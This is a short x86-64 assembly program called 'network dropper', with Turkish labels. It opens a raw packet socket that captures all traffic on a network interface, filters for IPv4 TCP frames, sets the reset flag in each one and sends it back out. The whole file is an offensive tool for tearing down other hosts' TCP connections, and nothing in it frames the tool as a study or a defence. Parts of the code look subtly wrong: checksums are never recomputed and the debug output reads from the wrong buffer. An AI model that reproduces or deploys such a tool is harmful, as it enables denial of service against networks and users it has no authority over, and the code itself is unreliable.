bits 64 ; network dropper
; usage ./networkdropper debug
section .data
    ; errors
    e1 db "Won't create a raw socket. permission error",0x0a,0x00
    ; success
    s1 db "Created raw socket successfully",0x0a,0x00
    ; status
    sta1 db "Debug mode is ",0x00
    sta1a1 db "enabled",0x0a,0x00 ; status 1 argument 1
    sta1a2 db "disabled",0x0a,0x00 ;; status 1 argument 2
    sockfd dq 0
    bindset: 
    dw 17
    dw 0x0300
    dd 0x02
    dq 0x02
    dq 0x00
    bindsetlen equ $-bindset
    packet times 150 dq 0 ; len 54 ; +38=hedef port
    packetlen dq $-packet
    debugmode dq 0
    debugstring db "debug",0x00
section .text
    global main
main:
    call controldebug
    call pdstatus
    call csoc
    call bind

haziriz:
    call rfs
    call ethernetipv4tcp
    call playwithflags
    jmp haziriz
    call exit

playwithflags:
    mov byte [packet+47],00000100b ; set to only reset flag
    mov rax,1
    mov rdi,[sockfd]
    mov rsi,packet
    mov rdx,[packetlen]
    syscall
    ret

ethernetipv4tcp:
    mov rdi,packet
    add rdi,12 ; 6 dst 6 src mac bytes
    mov ax, word [rdi]
    cmp ax,0x0008
    je tamambuipv4
    pop r15 ; remove return adres from stack when called function
    jmp haziriz
    tamambuipv4:
    add rdi,0xb
    mov byte al,[rdi]
    cmp al,0x6
    je tamambutcp
    pop r15
    jmp haziriz
    tamambutcp:
    cmp qword [debugmode],1
    je printfordebug
    ret

printfordebug:
    mov rax,1
    mov rdi,1
    mov rsi,packetlen
    mov rdx,[packetlen]
    ;add rsi,54
    ;sub rdx,54
    syscall
    ret



pdstatus: ; print debug status
    mov rdi,1
    mov rsi,sta1
    call puz
    cmp qword [debugmode],1
    jne desetlenmedi
    mov rsi,sta1a1
    call puz
    ret
    desetlenmedi:
    mov rsi,sta1a2
    call puz
    ret
    

controldebug:
    push rbp
    mov rbp,rsp
    mov rdi,[rbp+0x20]
    cmp rdi,0x00
    je argumanyok
    mov rsi,debugstring
    mov rcx,5
    rep cmpsb
    je argumanvar
    argumanyok:
    mov qword [debugmode],0
    jmp endofcontroldebug
    argumanvar:
    mov qword [debugmode],1
    endofcontroldebug:
    mov rsp,rbp
    pop rbp
    ret

rfs: ; read from socket
    mov rax,0
    mov rdi,[sockfd]
    mov rsi,packet
    mov rdx,0x4b0
    syscall
    mov [packetlen],rax
    ret

bind:
    mov rax,49
    mov rdi,[sockfd]
    mov rsi,bindset
    mov rdx,bindsetlen
    syscall
    ret

csoc:
    mov rax,41
    mov rdi,17
    mov rsi,3
    mov rdx,0x300
    syscall
    cmp rax,0
    jg csucs
    mov rdi,2
    mov rsi,e1
    call puz
    call exit
    csucs:
    mov [sockfd],rax
    mov rsi,s1
    mov rdi,1
    call puz
    ret

puz: ; print until zero. before call set to rdi.
    mov rdx,1
    puzzloop:
    cmp byte [rsi],0x00
    je puzret
    mov rax,1
    syscall
    inc rsi
    jmp puzzloop
    puzret:
    ret

exit:
    mov rax,"<"
    xor rdi,rdi
    syscall
